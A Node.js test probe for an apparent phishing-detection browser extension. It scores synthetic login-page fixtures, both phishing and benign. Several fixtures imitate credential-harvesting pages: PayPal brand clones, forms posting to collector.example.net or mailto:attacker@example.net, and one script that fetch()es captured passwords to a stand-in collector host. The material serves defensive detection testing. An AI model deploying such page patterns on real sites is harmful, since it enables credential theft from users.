const extract = require('../../extension/tests/unit/extract-fixture.cjs');
const { scoreEvidence } = require('../../extension/src/shared/model-policy.js');
const fs = require('node:fs');
const path = require('node:path');
const pw = '<input type="password" name="password">';
const fixtures = [
  ['clone first-party HTTPS', 'https://billing-review.example/login', '<title>Secure sign in</title><p>Please sign in to continue</p><form method="post" action="/collect">' + pw + '</form>'],
  ['recognized branded first-party clone', 'https://billing-review.example/login', '<title>PayPal sign in</title><form method="post" action="/collect">' + pw + '</form>'],
  ['same phishing hosted on recognized domain', 'https://sites.google.com/view/demo', '<title>PayPal sign in</title><form method="post" action="https://collector.example.net/collect">' + pw + '</form>'],
  ['same phishing unknown domain', 'https://host.example/view/demo', '<title>PayPal sign in</title><form method="post" action="https://collector.example.net/collect">' + pw + '</form>'],
  ['JS sends to cross-site', 'https://billing-review.example/login', '<title>Sign in</title><form method="post" action="/session">' + pw + '</form><script>document.forms[0].addEventListener("submit", e => { e.preventDefault(); fetch("https://collector.example.net/collect", {method:"POST",body:new FormData(e.target)}); });</script>'],
  ['default GET missing method cross-site', 'https://billing-review.example/login', '<title>Sign in</title><form action="https://collector.example.net/collect">' + pw + '</form>'],
  ['explicit GET same page cross-site', 'https://billing-review.example/login', '<title>Sign in</title><form method="get" action="https://collector.example.net/collect">' + pw + '</form>'],
  ['mailto password form', 'https://billing-review.example/login', '<title>Sign in</title><form method="post" action="mailto:attacker@example.net">' + pw + '</form>'],
  ['hidden submit target fallback', 'https://college.example/login', '<title>Member Portal</title><form method="post" action="/session">' + pw + '<button>Continue</button><button hidden formaction="http://old-sso.example.net/login">Legacy</button></form>'],
  ['contenteditable fake password', 'https://billing-review.example/login', '<title>PayPal sign in</title><form method="get" action="http://collector.example.net/collect"><div contenteditable="true" role="textbox" aria-label="Password"></div></form>'],
  ['visible card generic labels', 'https://billing-review.example/login', '<title>Secure checkout</title><form method="post" action="/collect"><label>Credit card<input name="x"></label><label>Expiration<input name="y"></label><label>Security code<input name="z"></label></form>'],
  ['auto HTTP orphan password field', 'http://billing-review.example/login', '<title>PayPal sign in</title>' + pw],
  ['benign federated title with your account', 'https://college.example/login', '<title>Sign in with your Google Account</title><form method="post" action="https://accounts.google.com/login"><input type="email" autocomplete="username"></form>'],
  ['benign federated title with a account', 'https://college.example/login', '<title>Sign in with a Google Account</title><form method="post" action="https://accounts.google.com/login"><input type="email" autocomplete="username"></form>'],
  ['benign continue with microsoft account', 'https://college.example/login', '<title>Continue with your Microsoft Account</title><form method="post" action="https://login.microsoftonline.com/login"><input type="email" autocomplete="username"></form>'],
  ['email-only password recovery GET', 'https://college.example/recover', '<title>Password recovery</title><form method="get" action="https://auth.example.net/recover"><label>Enter your email to reset your password<input type="email" name="email"></label></form>'],
  ['email-only password recovery neutral label', 'https://college.example/recover', '<title>Password recovery</title><form method="get" action="https://auth.example.net/recover"><label>Email address<input type="email" name="email"></label></form>'],
  ['recognized country Google domain login', 'https://www.google.ch/login', '<title>Google sign in</title><form method="post" action="https://accounts.google.com/login">' + pw + '</form>'],
  ['closed details inactive credential form', 'https://college.example/', '<title>Member Portal</title><details><summary>Legacy login unavailable</summary><form method="post" action="http://old-sso.example.net/login">' + pw + '<button>Continue</button></form></details>'],
  ['closed dialog inactive credential form', 'https://college.example/', '<title>Member Portal</title><dialog><form method="post" action="http://old-sso.example.net/login">' + pw + '<button>Continue</button></form></dialog>'],
  ['content visibility hidden credential form', 'https://college.example/', '<title>Member Portal</title><div style="content-visibility:hidden"><form method="post" action="http://old-sso.example.net/login">' + pw + '<button>Continue</button></form></div>'],
  ['body-only PayPal brand clone', 'https://billing-review.example/login', '<title>Sign in</title><h1>PayPal</h1><form method="post" action="/collect">' + pw + '</form>'],
  ['closed shadow credential form', 'https://billing-review.example/login', '<title>PayPal sign in</title><div id="host"></div>', (window) => {
    window.document.getElementById('host').attachShadow({ mode: 'closed' }).innerHTML = '<form method="get" action="http://collector.example.net/collect">' + pw + '</form>';
  }]
];
const results = [];
for (const [name, url, html, setup] of fixtures) {
  const f = extract(html, url, setup);
  const r = scoreEvidence(f);
  const result = { name, score: r.score, outcome: r.outcome,
    credential: f.credential_context, sensitive: f.sensitive_credential_field_count,
    hasPassword: f.has_password_input, bodyBrand: f.brand_name_in_visible_text,
    mismatch: f.brand_domain_mismatch, cross: f.cross_domain_form_action,
    script: f.credential_script_activity, methodGet: f.credential_form_method_get,
    declaredGet: f.credential_form_explicit_get, categories: r.categories };
  results.push(result);
  console.log(JSON.stringify(result));
}
fs.writeFileSync(path.join(__dirname, 'detection-probe-results-2026-10-25.json'), JSON.stringify({ syntheticOnly: true, pageScriptsExecuted: false, cases: results }, null, 2) + '\n');
